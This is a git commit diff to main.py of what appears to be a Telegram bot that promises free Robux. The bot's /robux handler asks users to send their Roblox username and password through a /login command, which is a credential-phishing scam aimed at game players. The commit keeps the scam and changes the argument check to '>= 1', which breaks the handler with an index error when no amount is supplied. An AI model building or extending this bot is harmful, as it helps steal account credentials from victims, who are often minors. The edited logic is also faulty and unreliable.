82a21e898f953fea9f49a114952e75ecac167dd1
Your Name <you@example.com>
2024-12-29 13:40:03 +0300

    added text to py file and edited args to amount of robux

--- main.py
+++ main.py
@@ -16,7 +16,7 @@ async def start(message: Message):
 @dp.message(Command('robux'))
 async def robux(message: Message):
     args = message.text.split()
-    if len(args) > 1:
+    if len(args) >= 1:
         amount = args[1]
         await message.answer(f'You will receive {amount} robux, but you need to log in to your roblox account. Please enter your username and password in the following format: /login username password')
     else:
@@ -40,3 +40,4 @@ async def main() -> None:
 
 if __name__ == '__main__':
     asyncio.run(main())
+    print('Bot is running')
